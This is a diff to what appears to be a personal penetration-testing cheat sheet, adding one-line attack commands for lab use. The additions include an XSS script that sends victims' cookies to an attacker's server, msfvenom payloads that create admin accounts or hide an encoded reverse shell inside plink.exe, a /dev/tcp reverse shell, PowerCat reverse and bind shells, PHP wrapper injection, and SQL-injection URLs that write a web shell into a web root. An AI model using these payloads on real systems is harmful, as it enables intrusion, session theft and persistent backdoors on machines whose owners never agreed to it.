@@ -120,6 +120,16 @@ int main(int argc, char *argv[])
 * `sudo du -xh --max-depth=1 /var`
 * `sudo du -xh --max-depth=1 /var/log`
 
+## cookie stealing
+
+* `<script>new Image().src="http://<python3 http server running in kali IP>:<PORT>/cool.jpg?output="+document.cookie;</script>`
+
+## crackmapexec
+
+* `crackmapexec -t 20 smb --shares <target> -u '' -p '' -d <FQDN> `
+* `crackmapexec winrm <target IP> -u users -H hashes`
+* `crackmapexec smb -u '' -p '' -d <domain> ./smb-hosts.txt --pass-policy`
+
 ## curl
 You can do some great things with **_curl_**, it's worth going through it's man page, this is one of the great techniques I use quite often:
 
@@ -290,9 +300,13 @@ Cracking some SHA256 hashes with john, using the rockyou.txt as a wordlist, redi
 
 ## msfvenom
 
-* *_Windows add user:_* `msfvenom -p windows/adduser USER=hacker PASS=Password123! -f exe -o hackware.exe`
+* Windows add user: `msfvenom -p windows/adduser USER=hacker PASS=Password123! -f exe -o hackware.exe`
+* add user to the local administrator group: `msfvenom -p windows/x64/exec CMD="net localgroup Administrators <username> /add" -f exe -o mysqld.exe`
+* into an existing file: `msfvenom -p windows/shell_reverse_tcp LHOST=<kali IP> LPORT=<kali PORT> -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe`
 
-* _add user to the local administrator group:_ `msfvenom -p windows/x64/exec CMD="net localgroup Administrators <username> /add" -f exe -o mysqld.exe`
+## mysql
+
+* start on Windows: `set path=%PATH%;D:\xampp\mysql\bin;` then: `mysql -u root -p`
 
 ## netsh / Windows
 
@@ -320,6 +334,15 @@ If you need to generate a nice html report from the output you can use *_xsltpro
 
 * `select ("<?php system($_REQUEST['cmd'])?>") INTO DUMPFILE C:\\wamp\\apps\\phpmyadmin5.0.2\\cmd.php`
 
+## php web server
+
+* `php -S 0.0.0.0:8000`
+
+## php wrapper
+
+* `http://<target IP>/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>`
+* `<?php echo system("0<&196;exec 196<>/dev/tcp/10.11.0.191/443; sh <&196 2>&196"); ?>`
+
 ## Pihole ( and Unbound)
 
 * For easy install and setup follow the steps in this blog post at **[Crosstalk Soutions](https://www.crosstalksolutions.com/the-worlds-greatest-pi-hole-and-unbound-tutorial-2023/)**
@@ -331,6 +354,21 @@ If you are interested in more depth on this matter check out the cyberchef's web
 * `echo -n 'hashes are cool' | base64` encoding with base64
 * `echo -n 'aGFzaGVzIGFyZSBjb29s' | base64 -d` decoding with base64
 * `echo -n 'hashes are cool' | rot13` encoding and decoding is the same synthax
+
+## PowerCat
+
+* file transfer: 
+	* on target: `powercat -c 10.11.0.4 -p 443 -i C:\Users\user\powercat.ps1`
+	* on kali: `nc -lnvp 443 > receiving_powercat.ps1`
+* reverse shell:
+	* `powercat -c 192.168.115.111 -p 1234 -e cmd.exe` or `powercat -c 192.168.115.111 -g > reverseshell.ps1` and `revereshell.ps1` on kali of course: `nc -lnvp 1234`
+* bind shell:
+	* encoded bind shell: `powercat -l -p 443 -e cmd.exe -ge > encoded_bindshell.ps1`
+	* on kali: `nc -nv <targetg IP> 443`
+* port forward:
+	* `powercat -l -p 9090 -r tcp:<kali IP>:<kali PORT> -v`
+* port scan:
+	* on target: `(21,22,80,443) | % {powercat -c <target IP> -p $_ -t 1 -Verbose -d}`
 
 ## public IP from terminal
 
@@ -422,9 +460,12 @@ This will create the key file named `bind.key` and the certificate file named�
 * from rev shell with plink: `cmd.exe /c echo y | plink.exe -ssh -l kali -pw ilak -R 10.10.10.12:1234:127.0.0.1:3306 10.10.10.12`
 * from RDP session: `plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4`
 
-## sql
+## sql (command execution)
 
 * into outfile: `SELECT “<?php system($_GET['cmd']); ?>” into outfile “/var/www/WEBROOT/backups”`
+* command and code execution: (http) 
+	* `http://10.10.10.10/debug.php?id=1 union all select 1, 2, load_file('C:\Windows\System32\drivers\etc\hosts)'`
+	* `http://10.10.10.10/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']); ?>)" INTO OUTFILE 'c:/xampp/htdocs/backdoor.php'` and then: `http://10.10.10.10/backdoor.php?cmd=ipconfig`
 
 ## sqlmap
 One of my favorite tecniques I learned from [ippsec](https://ippsec.rocks/?#) is to capture a login request with Burp and save it in a file like login.req, then in sqlmap I can just use `sqlmap -r login.req --level 5 --risk 3` to try to find a vuln.
